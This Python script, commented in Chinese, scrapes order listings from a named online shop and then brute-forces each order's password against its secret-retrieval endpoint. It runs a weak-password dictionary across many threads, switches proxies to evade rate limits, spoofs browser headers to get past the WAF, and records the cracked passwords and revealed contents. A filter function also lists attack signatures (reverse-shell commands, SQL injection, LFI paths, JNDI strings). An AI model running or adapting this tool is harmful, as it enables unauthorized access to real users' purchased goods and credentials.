# -*- coding: utf-8 -*-
""" :description: 接口数据拉取与多线程凭据验证工具 """

import concurrent.futures
import json
import logging
import os
import random
import threading
import time
from typing import Any, Dict, List, Optional

import requests
import urllib3
from filelock import FileLock

symbol = "zhanghao"

def read_json(json_path):
    """
    读取 JSON 文件并返回内容。

    Args:
        json_path (str): JSON 文件的路径。

    Returns:
        dict: 解析后的 JSON 内容。
    """
    if not os.path.exists(json_path):
        return {}

    with open(json_path, 'r', encoding='utf-8') as f:
        try:
            data = json.load(f)
            return data
        except json.JSONDecodeError as e:
            raise ValueError(f"无法解析 JSON 文件 '{json_path}': {e}")


def save_json(json_path, data):
    dir_path = os.path.dirname(json_path)
    if dir_path:
        os.makedirs(dir_path, exist_ok=True)

    # 锁文件通常以 .lock 结尾
    lock_path = json_path + ".lock"

    # FileLock 会在文件系统层面创建锁，支持多进程和多线程安全
    with FileLock(lock_path):
        # 原子写入
        tmp_path = json_path + ".tmp"
        with open(tmp_path, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=4, default=str)
        os.replace(tmp_path, json_path)

# 代理地址（不再全局生效，由每次请求随机决定是否使用）
PROXY_URL = "http://127.0.0.1:7890"

# 已完成匹配的 trade_no 记录文件（JSON dict，key=trade_no，value=包含time及结果的dict），避免中断后重复匹配
CRACKED_TRADE_NO_FILE = f"cracked_trade_no_{symbol}.json"

# 禁用因 verify=False 产生的 SSL 安全警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 配置日志输出格式，避免多线程 print 乱序
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(threadName)s: %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger(__name__)

# ==================== 全局配置 ====================
CONFIG = {
    "BASE_URL": "https://zhanghao66.com",  # 改为 https
    "ENDPOINTS": {
        "QUERY": "/user/api/index/query",
        "SECRET": "/user/api/index/secret",
    },
    "HEADERS": {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:153.0) Gecko/20100101 Firefox/153.0", # 还原 Firefox UA
        "Accept": "*/*",
        "Accept-Language": "zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Referer": "https://zhanghao66.com/user/index/query", # 改为 https
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "https://zhanghao66.com", # 改为 https
        "Sec-GPC": "1",
        "Connection": "keep-alive",
        # 补充现代浏览器特征头，防 WAF 拦截
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Priority": "u=0",
    },
    "COOKIES": {
        # 还原抓包到的真实 Cookie，请确保该 Cookie 未过期
        "ACG_CSP": "e1b3ba11fc8230a0e433284a09902485",
    },
}

import re


def clean_weak_passwords(passwords):
    r"""
    清洗弱密码字典，移除可能触发 WAF / 安全检测或导致请求异常的不合规条目。

    清洗规则：
      1. 空值 / 纯空白 / 非字符串
      2. 包含控制字符（换行、制表符、NULL 等）
      3. XSS 攻击特征（<script、alert(、onerror=、javascript: 等）
      4. SQL 注入特征（union select、or 1=1、drop table、-- 等）
      5. 命令注入特征（; rm -rf、| cat、`whoami`、$(...) 等）
      6. 路径遍历特征（../、..\ 等）
      7. LFI 敏感文件路径（/etc/passwd、C:\Windows\system32、boot.ini 等）
      8. SSTI 服务端模板注入（{{7*7}}、{%...%}、${...} 等）
      9. Log4j / JNDI 注入（${jndi:ldap://...} 等）
      10. SSRF / URL scheme（http://、https://、file://、gopher:// 等）
      11. JS 原型污染 / 对象特征（[object Object]、__proto__、constructor 等）
      12. 长度超过 128 字符
      13. 仅由特殊符号组成且无实际密码意义（如 "!!!", "@@@"）

    Args:
        passwords: 原始密码列表。

    Returns:
        清洗后的密码列表（保持原顺序，已去重）。
    """
    if not isinstance(passwords, list):
        print("[清洗] 输入不是列表，实际类型: %s，返回空列表" % type(passwords).__name__)
        return []

    # ---------- 预编译正则 ----------
    # 控制字符：ASCII 0-31 和 127
    control_char_re = re.compile(r'[\x00-\x1f\x7f]')

    # XSS 特征
    xss_patterns = [
        r'<\s*script',
        r'alert\s*\(',
        r'prompt\s*\(',
        r'confirm\s*\(',
        r'on\w+\s*=',
        r'javascript\s*:',
        r'data\s*:\s*text',
        r'<\s*iframe',
        r'<\s*svg',
        r'<\s*img',
        r'<\s*body',
        r'document\.',
        r'window\.',
        r'eval\s*\(',
        r'setcookie\s*\(',
        r'<\s*a\s+href',
    ]
    xss_re = re.compile('|'.join(xss_patterns), re.IGNORECASE)

    # SQL 注入特征
    sql_patterns = [
        r'\bunion\b\s+\bselect\b',
        r'\bunion\b\s+\ball\b',
        r'\bor\b\s+1\s*=\s*1',
        r'\band\b\s+1\s*=\s*1',
        r'\bdrop\b\s+\btable\b',
        r'\bdrop\b\s+\bdatabase\b',
        r'\binsert\b\s+\binto\b',
        r'\bdelete\b\s+\bfrom\b',
        r'\bupdate\b\s+\w+\s+\bset\b',
        r'\bselect\b.+\bfrom\b',
        r'--\s*$',
        r';\s*--',
        r'/\*.*\*/',
        r'\bxp_cmdshell\b',
        r'\bsleep\s*\(',
        r'\bbenchmark\s*\(',
        r'\binformation_schema\b',
        r'\bload_file\s*\(',
        r'\binto\s+outfile\b',
    ]
    sql_re = re.compile('|'.join(sql_patterns), re.IGNORECASE)

    # 命令注入特征
    cmd_patterns = [
        r';\s*rm\s+-',
        r';\s*cat\s+',
        r';\s*ls\b',
        r';\s*wget\b',
        r';\s*curl\b',
        r'\|\s*cat\b',
        r'\|\s*ls\b',
        r'`\w+`',
        r'\$\([^)]+\)',
        r'\|\s*/bin/',
        r';\s*/bin/',
        r'\bnc\s+-e\b',
        r'\bbash\s+-i\b',
        r';\s*ping\b',
        r';\s*chmod\b',
        r'\|\s*/dev/tcp/',
    ]
    cmd_re = re.compile('|'.join(cmd_patterns), re.IGNORECASE)

    # 路径遍历（../ 或 ..\）
    path_traversal_re = re.compile(r'\.\./|\.\.\\')

    # LFI 敏感文件路径（Linux 绝对路径 + Windows 敏感路径）
    lfi_patterns = [
        r'/etc/passwd',
        r'/etc/shadow',
        r'/etc/hosts',
        r'/etc/group',
        r'/etc/issue',
        r'/proc/self',
        r'/proc/version',
        r'/var/log/',
        r'/var/www/',
        r'/root/',
        r'/home/[^/]+/\.ssh',
        r'/usr/local/etc',
        r'/opt/lampp',
        r'\\windows\\system32',
        r'\\windows\\syswow64',
        r'\\windows\\win\.ini',
        r'\\windows\\boot\.ini',
        r'\\windows\\repair',
        r'\\windows\\system32\\drivers\\etc\\hosts',
        r'c:\\windows',
        r'c:\\winnt',
        r'c:\\programdata',
        r'c:\\documents and settings',
        r'c:\\users\\.*\\desktop',
        r'c:\\users\\.*\\documents',
        r'boot\.ini',
        r'win\.ini',
        r'\\.ssh\\id_rsa',
        r'/\.ssh/id_rsa',
    ]
    lfi_re = re.compile('|'.join(lfi_patterns), re.IGNORECASE)

    # SSTI 服务端模板注入（Jinja2 / Twig / Freemarker / Velocity 等）
    ssti_patterns = [
        r'\{\{.*\}\}',          # {{7*7}}, {{config}}, {{_self.env}}
        r'\{%.*%\}',            # {% debug %}, {{7*7}}
        r'\$\{.*\}',            # ${7*7}, ${T(java.lang.Runtime)}  —— 注意：与 Log4j 有重叠，但这里先统一拦截
        r'#set\s*\(',           # Velocity #set()
        r'#foreach',            # Velocity #foreach
        r'<#assign',            # Freemarker
        r'<#list',              # Freemarker
        r'freemarker\.template',
        r'\.getclass\s*\(',
        r'\.forname\s*\(',
        r'class\.forname',
        r'type\.class',
        r'\_\_class\_\_',
        r'\_\_mro\_\_',
        r'\_\_subclasses\_\_',
        r'\_\_globals\_\_',
        r'\_\_builtins\_\_',
        r'\_import\_',
        r'os\.system',
        r'subprocess\.',
        r'config\.items',
        r'request\.application',
        r'self\.env',
    ]
    ssti_re = re.compile('|'.join(ssti_patterns), re.IGNORECASE)

    # Log4j / JNDI 注入
    log4j_patterns = [
        r'\$\{jndi\s*:',        # ${jndi:ldap://...}
        r'\$\{java\s*:',        # ${java:vm}
        r'\$\{ldap\s*:',        # ${ldap://...}
        r'\$\{rmi\s*:',         # ${rmi://...}
        r'\$\{dns\s*:',         # ${dns://...}
        r'\$\{iiop\s*:',        # ${iiop://...}
        r'\$\{corba\s*:',       # ${corba://...}
        r'\$\{nis\s*:',         # ${nis://...}
        r'\$\{nds\s*:',         # ${nds://...}
        r'\$\{http\s*:',        # ${http://...}
        r'\$\{lower\s*:',       # ${lower:...}
        r'\$\{upper\s*:',       # ${upper:...}
        r'\$\{env\s*:',         # ${env:PATH}
        r'\$\{sys\s*:',         # ${sys:java.version}
        r'\$\{main\s*:',        # ${main:...}
        r'\$\{date\s*:',        # ${date:...}
        r'jndi:ldap://',
        r'jndi:rmi://',
        r'jndi:dns://',
    ]
    log4j_re = re.compile('|'.join(log4j_patterns), re.IGNORECASE)

    # SSRF / 危险 URL scheme（作为密码出现时几乎都是测试 payload）
    ssrf_patterns = [
        r'https?://',           # http://, https://
        r'file://',             # file:///etc/passwd
        r'gopher://',           # gopher://
        r'dict://',             # dict://
        r'ftp://',              # ftp://
        r'sftp://',             # sftp://
        r'tftp://',             # tftp://
        r'ldap://',             # ldap://
        r'ldaps://',            # ldaps://
        r'rmi://',              # rmi://
        r'iiop://',             # iiop://
        r'gopher://',
        r'php://',              # php://input, php://filter
        r'zip://',              # zip://
        r'zlib://',             # zlib://
        r'data://',             # data://
        r'expect://',           # expect://
        r'glob://',             # glob://
        r'phar://',             # phar://
    ]
    ssrf_re = re.compile('|'.join(ssrf_patterns), re.IGNORECASE)

    # JS 原型污染 / 对象特征
    proto_patterns = [
        r'\[object\s+Object\]', # [object Object]
        r'__proto__',           # __proto__
        r'prototype\.',         # prototype.
        r'\.constructor',       # .constructor
        r'constructor\.',       # constructor.
        r'Object\.prototype',
        r'JSON\.parse',
        r'toString\.call',
        r'hasOwnProperty',
        r'function\s*\(',       # function() { ... }
        r'=>\s*\{',             # 箭头函数 () => { ... }
        r'\.then\s*\(',         # Promise .then()
        r'\.call\s*\(',
        r'\.apply\s*\(',
        r'document\.cookie',
        r'document\.location',
        r'window\.location',
        r'localStorage\.',
        r'sessionStorage\.',
    ]
    proto_re = re.compile('|'.join(proto_patterns), re.IGNORECASE)

    # XML 外部实体注入（XXE）
    xxe_patterns = [
        r'<!ENTITY',
        r'<!DOCTYPE',
        r'SYSTEM\s+"',
        r'PUBLIC\s+"',
        r'xmlns:xxe',
    ]
    xxe_re = re.compile('|'.join(xxe_patterns), re.IGNORECASE)

    # 仅特殊符号（无字母数字中文）
    only_special_re = re.compile(r'^[^a-zA-Z0-9\u4e00-\u9fa5]+$')

    # ---------- 逐行清洗 ----------
    cleaned = []
    seen = set()
    stats = {
        "total": len(passwords),
        "duplicate": 0,
        "empty": 0,
        "non_string": 0,
        "control_char": 0,
        "xss": 0,
        "sql_injection": 0,
        "command_injection": 0,
        "path_traversal": 0,
        "lfi": 0,
        "ssti": 0,
        "log4j": 0,
        "ssrf": 0,
        "prototype_pollution": 0,
        "xxe": 0,
        "too_long": 0,
        "only_special": 0,
        "passed": 0,
    }
    removed_examples = {
        "control_char": [],
        "xss": [],
        "sql_injection": [],
        "command_injection": [],
        "path_traversal": [],
        "lfi": [],
        "ssti": [],
        "log4j": [],
        "ssrf": [],
        "prototype_pollution": [],
        "xxe": [],
        "too_long": [],
        "only_special": [],
    }

    MAX_LEN = 128

    for pwd in passwords:
        # 1. 非字符串
        if not isinstance(pwd, str):
            stats["non_string"] += 1
            continue

        # 2. 空值 / 纯空白
        if not pwd or not pwd.strip():
            stats["empty"] += 1
            continue

        # 3. 去重
        if pwd in seen:
            stats["duplicate"] += 1
            continue
        seen.add(pwd)

        # 4. 控制字符
        if control_char_re.search(pwd):
            stats["control_char"] += 1
            if len(removed_examples["control_char"]) < 5:
                removed_examples["control_char"].append(repr(pwd))
            continue

        # 5. XSS
        if xss_re.search(pwd):
            stats["xss"] += 1
            if len(removed_examples["xss"]) < 5:
                removed_examples["xss"].append(pwd)
            continue

        # 6. SQL 注入
        if sql_re.search(pwd):
            stats["sql_injection"] += 1
            if len(removed_examples["sql_injection"]) < 5:
                removed_examples["sql_injection"].append(pwd)
            continue

        # 7. 命令注入
        if cmd_re.search(pwd):
            stats["command_injection"] += 1
            if len(removed_examples["command_injection"]) < 5:
                removed_examples["command_injection"].append(pwd)
            continue

        # 8. 路径遍历
        if path_traversal_re.search(pwd):
            stats["path_traversal"] += 1
            if len(removed_examples["path_traversal"]) < 5:
                removed_examples["path_traversal"].append(pwd)
            continue

        # 9. LFI 敏感文件路径
        if lfi_re.search(pwd):
            stats["lfi"] += 1
            if len(removed_examples["lfi"]) < 5:
                removed_examples["lfi"].append(pwd)
            continue

        # 10. Log4j / JNDI（在 SSTI 之前检查，因为 ${jndi:...} 更具体）
        if log4j_re.search(pwd):
            stats["log4j"] += 1
            if len(removed_examples["log4j"]) < 5:
                removed_examples["log4j"].append(pwd)
            continue

        # 11. SSTI 模板注入
        if ssti_re.search(pwd):
            stats["ssti"] += 1
            if len(removed_examples["ssti"]) < 5:
                removed_examples["ssti"].append(pwd)
            continue

        # 12. SSRF / 危险 URL scheme
        if ssrf_re.search(pwd):
            stats["ssrf"] += 1
            if len(removed_examples["ssrf"]) < 5:
                removed_examples["ssrf"].append(pwd)
            continue

        # 13. JS 原型污染 / 对象特征
        if proto_re.search(pwd):
            stats["prototype_pollution"] += 1
            if len(removed_examples["prototype_pollution"]) < 5:
                removed_examples["prototype_pollution"].append(pwd)
            continue

        # 14. XXE
        if xxe_re.search(pwd):
            stats["xxe"] += 1
            if len(removed_examples["xxe"]) < 5:
                removed_examples["xxe"].append(pwd)
            continue

        # 15. 过长
        if len(pwd) > MAX_LEN:
            stats["too_long"] += 1
            if len(removed_examples["too_long"]) < 5:
                removed_examples["too_long"].append("%s...(len=%d)" % (pwd[:40], len(pwd)))
            continue

        # 16. 仅特殊符号
        if only_special_re.match(pwd):
            stats["only_special"] += 1
            if len(removed_examples["only_special"]) < 5:
                removed_examples["only_special"].append(pwd)
            continue

        # 通过
        cleaned.append(pwd)
        stats["passed"] += 1

    # ---------- 打印统计 ----------
    total_removed = (
        stats["duplicate"] + stats["empty"] + stats["non_string"]
        + stats["control_char"] + stats["xss"] + stats["sql_injection"]
        + stats["command_injection"] + stats["path_traversal"]
        + stats["lfi"] + stats["ssti"] + stats["log4j"]
        + stats["ssrf"] + stats["prototype_pollution"] + stats["xxe"]
        + stats["too_long"] + stats["only_special"]
    )

    print("=" * 60)
    print("【弱密码字典清洗统计】")
    print("=" * 60)
    print("  原始条目数          : %d" % stats["total"])
    print("  通过清洗            : %d" % stats["passed"])
    print("  移除总数            : %d" % total_removed)
    print("-" * 60)
    print("  - 重复条目          : %d" % stats["duplicate"])
    print("  - 空值/纯空白       : %d" % stats["empty"])
    print("  - 非字符串类型      : %d" % stats["non_string"])
    print("  - 含控制字符        : %d" % stats["control_char"])
    print("  - XSS 攻击特征      : %d" % stats["xss"])
    print("  - SQL 注入特征      : %d" % stats["sql_injection"])
    print("  - 命令注入特征      : %d" % stats["command_injection"])
    print("  - 路径遍历特征      : %d" % stats["path_traversal"])
    print("  - LFI 敏感路径      : %d" % stats["lfi"])
    print("  - SSTI 模板注入     : %d" % stats["ssti"])
    print("  - Log4j/JNDI 注入   : %d" % stats["log4j"])
    print("  - SSRF/URL scheme   : %d" % stats["ssrf"])
    print("  - 原型污染/JS对象   : %d" % stats["prototype_pollution"])
    print("  - XXE 外部实体      : %d" % stats["xxe"])
    print("  - 超长(>%d字符)    : %d" % (MAX_LEN, stats["too_long"]))
    print("  - 仅特殊符号        : %d" % stats["only_special"])
    print("-" * 60)

    # 打印各类移除示例
    has_examples = False
    for category, examples in removed_examples.items():
        if examples:
            if not has_examples:
                print("【各类移除示例（每类最多 5 条）】")
                has_examples = True
            print("  [%s]" % category)
            for ex in examples:
                print("    - %s" % ex)
    if has_examples:
        print("-" * 60)

    print("清洗完成，最终保留 %d 条有效密码。" % len(cleaned))
    print("=" * 60)

    return cleaned



# 弱密码字典 (输入文件保持不变)
WEAK_PASSWORDS = read_json("weak_password.txt")

WEAK_PASSWORDS = clean_weak_passwords(WEAK_PASSWORDS)
# 去除长度大于11的元素
WEAK_PASSWORDS = [pwd for pwd in WEAK_PASSWORDS if len(pwd) <= 11]

WEAK_PASSWORDS = list(set(WEAK_PASSWORDS))

# 输出文件增加 symbol
save_json(f"weak_password_{symbol}.txt", WEAK_PASSWORDS)

class BaseClient:
    """基础网络客户端，维护全局 Session 连接池及配置"""

    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update(CONFIG["HEADERS"])
        self.session.cookies.update(CONFIG["COOKIES"])

        # 调优适配连接池大小，增强多线程复用
        adapter = requests.adapters.HTTPAdapter(pool_connections=50, pool_maxsize=50)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)

    def post(self, endpoint: str, data: dict, timeout: int = 10) -> Optional[requests.Response]:
        url = f"{CONFIG['BASE_URL']}{endpoint}"
        # 每次请求随机选择是否使用代理，降低集中触发频控的概率
        if random.choice([True, False]):
            proxies = {"http": PROXY_URL, "https": PROXY_URL}
        else:
            proxies = {}
        return self.session.post(url, data=data, timeout=timeout, verify=False, proxies=proxies)


class OrderCrawler:
    """订单/商品信息分页爬取服务"""

    def __init__(self, client: BaseClient):
        self.client = client

    def fetch_all_by_keyword(self, keyword: str, page_size: int = 10, max_retries: int = 300) -> List[
        Dict[str, Any]]:
        """根据关键字分页拉取全部匹配数据"""
        all_items = []
        current_page = 1
        total_count = None

        while True:
            payload = {"keywords": keyword, "page": current_page, "limit": page_size}
            res_json = None
            is_success = False

            for attempt in range(1, max_retries + 1):
                try:
                    resp = self.client.post(CONFIG["ENDPOINTS"]["QUERY"], data=payload)
                    resp.raise_for_status()
                    res_json = resp.json()

                    if res_json.get("code") == 200 and "data" in res_json:
                        is_success = True
                        break
                    logger.warning("[%s] 第 %s 页响应异常: %s，第 %s 次重试", keyword, current_page, res_json.get("msg"),
                                   attempt)
                except Exception as e:
                    logger.warning("[%s] 第 %s 页请求错误: %s，第 %s 次重试", keyword, current_page, e, attempt)

                time.sleep(attempt)

            if not is_success:
                logger.error("[%s] 第 %s 页请求超限失败，终止抓取。", keyword, current_page)
                break

            data_block = res_json.get("data", {})
            items = data_block.get("list", [])

            if total_count is None:
                total_count = data_block.get("total", 0)
                logger.info("[%s] 查询到总记录数: %s", keyword, total_count)

            if not items:
                break

            all_items.extend(items)
            logger.info("[%s] 已抓取第 %s 页 (%s/%s)", keyword, current_page, len(all_items), total_count)

            if len(all_items) >= total_count:
                break

            current_page += 1
            time.sleep(0.5)

        return all_items

    def batch_query(self, keywords_list: List[str], max_workers: int = 100,
                    save_every: int = 50, exist_data: Optional[Dict] = None,
                    save_path: Optional[str] = None) -> Dict[str, Dict[str, Any]]:
        """批量多关键字抓取（已修改为多线程并行并附加时间戳）"""
        results = {}
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers,
                                                   thread_name_prefix="QueryWorker") as executor:
            future_to_kw = {executor.submit(self.fetch_all_by_keyword, kw): kw for kw in keywords_list}
            for idx, future in enumerate(concurrent.futures.as_completed(future_to_kw), start=1):
                kw = future_to_kw[future]
                try:
                    res_list = future.result()
                    # 为每个key的value增加更新的时间戳结构
                    results[kw] = {
                        "update_time": time.strftime("%Y-%m-%d %H:%M:%S"),
                        "data": res_list
                    }
                    logger.info("=== [%s/%s] 完成关键字查询: %s ===", idx, len(keywords_list), kw)
                except Exception as e:
                    logger.error("=== [%s/%s] 关键字查询异常: %s, 错误: %s ===", idx, len(keywords_list), kw, e)

                # 每完成 save_every 个关键字，增量保存一次，避免中断后重头再来
                if save_path and exist_data is not None and idx % save_every == 0:
                    exist_data.update(results)
                    save_json(save_path, exist_data)
                    logger.info("=== 已完成 %s 个关键字，增量保存到 %s ===", idx, save_path)
        return results


class SecretCracker:
    """凭据并发验证器"""

    def __init__(self, client: BaseClient, result_file: str = f"success_records_{symbol}.txt"):
        self.client = client
        self.result_file = result_file
        self.stop_event = threading.Event()
        self.file_lock = threading.Lock()

    def _verify_worker(self, trade_no: str, password: str) -> tuple:
        """单密码探测任务（包含频控自动重试）"""
        data = {"tradeNo": trade_no, "password": password}

        while not self.stop_event.is_set():
            try:
                resp = self.client.post(CONFIG["ENDPOINTS"]["SECRET"], data=data)
                result = resp.json()
                code = result.get("code")

                # 匹配成功
                if code == 200:
                    self.stop_event.set()
                    logger.info("🎉 爆破成功! TradeNo: %s | Password: %s", trade_no, password)
                    return True, password, result

                # 触发频率限制
                if result.get("msg") == "请求过于频繁，请稍后再试":
                    time.sleep(3)
                    continue

                # 密码错误或其他普通业务失败
                return False, None, None

            except (requests.RequestException, ValueError) as e:
                logger.debug("尝试 [%s] 异常: %s", password, e)
                return False, None, None

        return False, None, None

    def _mark_trade_no_done(self, trade_no: str, success: bool = False, password: Optional[str] = None,
                            payload: Optional[dict] = None):
        """记录已完成匹配的 trade_no（JSON dict：key=trade_no，value=dict），避免中断后重复匹配"""
        with self.file_lock:
            cracked = read_json(CRACKED_TRADE_NO_FILE)
            if not isinstance(cracked, dict):
                cracked = {}

            record_value = {
                "time": time.strftime("%Y-%m-%d %H:%M:%S")
            }
            if success:
                record_value["Password"] = password
                record_value["Result"] = payload

            cracked[trade_no] = record_value
            save_json(CRACKED_TRADE_NO_FILE, cracked)

    def crack(self, trade_no: str, passwords: List[str], max_workers: int = 5):
        """启动多线程探测"""
        logger.info("开始匹配 TradeNo: %s | 字典规模: %s | 线程池: %s", trade_no, len(passwords), max_workers)
        self.stop_event.clear()

        success_flag = False
        success_password = None
        success_payload = None

        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers,
                                                   thread_name_prefix="CrackWorker") as executor:
            future_to_pwd = {executor.submit(self._verify_worker, trade_no, pwd): pwd for pwd in passwords}

            for future in concurrent.futures.as_completed(future_to_pwd):
                is_success, pwd, payload = future.result()
                if is_success:
                    success_flag = True
                    success_password = pwd
                    success_payload = payload
                    executor.shutdown(wait=False, cancel_futures=True)
                    break

        if not self.stop_event.is_set():
            logger.info("TradeNo: %s 尝试结束，字典中未找到正确密码。", trade_no)

        # 无论成功与否，都将包含结果字典写入配置的 JSON 记录中
        self._mark_trade_no_done(trade_no, success=success_flag, password=success_password, payload=success_payload)


# ==================== 执行入口 ====================
if __name__ == "__main__":
    # 初始化网络客户端容器
    api_client = BaseClient()

    # 1. 示例：分页数据批量查询
    target_keywords = WEAK_PASSWORDS
    # 输出文件增加 symbol
    final_data_path = f"final_data_{symbol}.json"

    exist_data = read_json(final_data_path)
    # 防御性处理：防止本地文件不存在时读取返回 None 导致后续 update 报错
    if not isinstance(exist_data, dict):
        exist_data = {}

    # 兼容旧版本数据格式（如果value是纯list，则转换为带时间戳的dict并强制标记为1970年以便触发重新拉取）
    for k, v in exist_data.items():
        if isinstance(v, list):
            exist_data[k] = {"update_time": "1970-01-01 00:00:00", "data": v}

    # 根据24小时过期策略筛选需要拉取的关键字
    final_keywords = []
    current_time = time.time()
    for kw in target_keywords:
        if kw not in exist_data:
            final_keywords.append(kw)
        else:
            val = exist_data[kw]
            update_time_str = val.get("update_time", "1970-01-01 00:00:00")
            try:
                update_time = time.mktime(time.strptime(update_time_str, "%Y-%m-%d %H:%M:%S"))
                if current_time - update_time >= 24 * 3600:
                    final_keywords.append(kw)
                    logger.info(f"关键字 '{kw}' 数据已超过24小时，将重新拉取并覆盖。")
            except ValueError:
                final_keywords.append(kw)

    exist_data = dict(
        sorted(
            exist_data.items(),
            key=lambda x: len(x[1].get("data", [])) if isinstance(x[1], dict) else 0,
            reverse=True
        )
    )
    good_password_list = []
    print("Top 10 keys by value length:")
    print_count = 0
    for key, value in list(exist_data.items()):
        orders = value.get("data", []) if isinstance(value, dict) else []
        if len(orders) > 0:
            good_password_list.append(key)
            if print_count < 10:
                print(f"key: '{key}', value_length: {len(orders)}")
                print_count += 1

    crawler = OrderCrawler(client=api_client)

    # 批量并发抓取数据（并行度 10，每完成 50 个关键字增量保存一次）
    final_data = crawler.batch_query(final_keywords, max_workers=2,
                                     save_every=50, exist_data=exist_data,
                                     save_path=final_data_path)
    exist_data.update(final_data)
    save_json(final_data_path, exist_data)  # 保存最终数据到 JSON 文件

    open_order_list = []
    # 2. 第二阶段：筛选 exist_data 订单中 status 为 1 的数据，生成完整的 trade_no 列表
    trade_no_list = []
    for kw, val in exist_data.items():
        orders = val.get("data", []) if isinstance(val, dict) else []
        # 确保 orders 是列表格式
        if isinstance(orders, list):
            for order in orders:
                if order.get("status") == 1 and order.get("trade_no"):
                    if order.get("password") == True:
                        trade_no_list.append(order.get("trade_no"))
                    else:
                        open_order_list.append(order)

    # 去重处理，避免同一个 trade_no 因为在不同 keyword 中出现导致被重复验证
    trade_no_list = list(set(trade_no_list))

    # 读取已完成匹配的 trade_no（JSON dict），过滤掉避免重复匹配
    cracked_data = read_json(CRACKED_TRADE_NO_FILE)
    cracked_trade_no_set = set(cracked_data.keys()) if isinstance(cracked_data, dict) else set()
    trade_no_list = [t for t in trade_no_list if t not in cracked_trade_no_set]

    logger.info("=== 第二阶段准备完毕，共提取到 %s 个待匹配的 trade_no ===", len(trade_no_list))

    # 3. 将 trade_no 列表一一进行密码匹配
    cracker = SecretCracker(client=api_client)
    for idx, target_trade_no in enumerate(trade_no_list, start=1):
        logger.info("--- 开始进度 [%s/%s] ---", idx, len(trade_no_list))
        cracker.crack(trade_no=target_trade_no, passwords=good_password_list, max_workers=10)